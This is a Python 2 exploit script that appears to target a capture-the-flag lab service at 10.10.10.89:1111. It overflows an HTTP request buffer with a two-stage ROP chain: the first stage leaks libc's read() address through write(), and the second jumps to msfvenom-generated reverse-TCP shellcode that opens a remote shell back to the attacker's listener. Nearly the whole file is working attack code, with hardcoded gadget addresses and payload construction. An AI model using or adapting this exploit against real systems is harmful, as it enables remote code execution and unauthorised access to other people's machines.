#!/usr/bin/env python
import sys
import tempfile
import subprocess
import os
import struct
import urllib
import socket

pop_rdi   = 0x4011DD # pop rdi; ret
pop_rsi   = 0x4011DB # pop rsi; pop r15; ret
read_got  = 0x603088 # read() GOT address
write_plt = 0x400C50 # write() PLT address
read_off  = 0x0F7250 # read() offset from libc base
exit_plt  = 0x400E10 # exit() PLT address
push_rsp  = 0x023AD1 # push rsp; ret

def request(addr, port, data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((addr, port))
    sock.send("GET /%s HTTP/1.1\r\n\r\n" % data)
    result = sock.recv(4096)
    sock.close()

    return result
  
def exploit(addr, port):
    print "[+] Generating shellcode..."
    
    temp = tempfile.mktemp()
    
    command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s " \
        "LPORT=%i -f raw -o %s" % (addr, port, temp)
        
    print "[-]", command
        
    subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        
    shellcode = open(temp, "rb").read()
    
    os.remove(temp)

    exploit = "A" * 568
    exploit += struct.pack("<Q", pop_rdi)
    exploit += struct.pack("<Q", 0x4)
    exploit += struct.pack("<Q", pop_rsi)
    exploit += struct.pack("<Q", read_got)
    exploit += struct.pack("<Q", 0x0)
    exploit += struct.pack("<Q", write_plt)
    exploit += struct.pack("<Q", exit_plt)
    exploit = urllib.quote_plus(exploit)

    print "[+] Sending stage 1 ROP chain..."

    data = request("10.10.10.89", 1111, exploit)
    libc = data.split("File not found")[1]
    libc = struct.unpack("<Q", libc[:8])[0] - read_off

    print "[-] libc base address: 0x%08X" % libc
    print "[+] Sending stage 2 shellcode..."

    exploit = "A" * 568
    exploit += struct.pack("<Q", libc + push_rsp)
    exploit += shellcode
    exploit += struct.pack("<Q", exit_plt)
    exploit = urllib.quote_plus(exploit)

    request("10.10.10.89", 1111, exploit)

    print "[*] Done! Check your listener!"

def usage():
    print "Usage: %s <addr> <port>" % sys.argv[0]
    sys.exit()
  
def main():
    if len(sys.argv) < 3:
        usage()
       
    addr = sys.argv[1]
    port = int(sys.argv[2])
       
    exploit(addr, port)
  
if __name__ == "__main__":
    main()
